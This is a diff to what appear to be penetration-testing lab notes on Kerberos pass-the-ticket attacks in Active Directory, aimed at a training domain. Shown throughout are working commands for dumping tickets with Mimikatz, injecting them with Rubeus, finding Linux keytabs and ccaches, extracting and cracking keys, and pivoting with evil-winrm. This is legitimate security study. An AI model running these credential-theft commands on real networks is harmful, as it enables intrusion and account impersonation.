@@ -44,7 +44,10 @@ Another method for moving laterally in an Active Directory environment is called
 ```bash
 # Harvesting Kerberos Tickets from Windows
 ## On Windows, tickets are processed and stored by the LSASS
-    
+
+ticket #=> pass the ticke attack
+ekeys #=> over pass the hash attack
+
 ## Mimikatz - Export Tickets
 mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" exit 
 dir *.kirbi #=> [randomvalue]-username@service-domain.local.kirbi
@@ -83,7 +86,7 @@ Rubeus asktgt /user:plaintext /rc4:<rc4_hmac_nt> /domain:inlanefreight.htb /nowr
 
 ## Rubeus Pass the Ticket
 Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt # submit the ticket TGT to the current logon session
-Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi # import the ticket into the current session
+Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi # if we have the ticket. import  it into the current session
 ### Pass the Ticket - Base64 Format
 ### we can perform a Pass the Ticket providing the base64 string instead of the file name.
 PS > [Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))  ## Convert .kirbi to Base64 Format
@@ -117,10 +120,17 @@ whoami ; hostname  # inlanefreight\john ; DC01
 ## Pass the Ticket (PtT) from Linux
 we manage to compromise a Linux machine connected to Active Directory. In that case, we could try to find Kerberos tickets to impersonate other users and gain more access to the network.
 ```bash
-# Kerberos tickets stored in: 
-/tmp #  (moste case)
-KRB5CCNAME  # environment variable (By default) 
-/etc/krb5.keytab  # machine account (access from root user only)
+# Kerberos tickets : 
+
+#Keytab ccache
+  /tmp # store the Keytab ccache 
+  KRB5CCNAME  # Keytab ccache environment variable (By default) 
+
+# keytab ticket
+  file.keytab # randoom location just search
+
+# machine ticket   
+  /etc/krb5.keytab  # machine account (access from root user only)
 
 # A keytab is a file containing pairs of Kerberos principals and encrypted keys
 
@@ -169,7 +179,7 @@ smbclient //dc01/carlos -k -c ls # Connecting to SMB Share as Carlos
 python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab # NTLM , AES-256 , AES-128 
 - # NTLM -> pass the hash attack
 - # AES-256 + AES-128 -> forge our tickets
-- su - carlos@inlanefreight.htb # crack the hash to get the plaintext pass then login as carlos
+- su - carlos@inlanefreight.htb # crack the NTLM hash to get the plaintext pass then login as carlos
 -----------------------------------------------------------------------------
 ## Abusing cronjob Keytab
 repeat the process, crack the password, and log in as #=> svc_workstations user
@@ -243,7 +253,7 @@ cat /etc/krb5.conf
 #### Using Evil-WinRM with Kerberos
 proxychains evil-winrm -i dc01 -r inlanefreight.htb #=> whoami : julio ; hostname : DC01
 -------------------------------------------------------------------------------
-## Convert tickets   
+## Convert ccache file or a kirbi file
 
 impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi # linux tickets to windows tickets
 impacket-ticketConverter julio.kirbi krb5cc_647401106_I8I133 # windows tickets to linux tickets
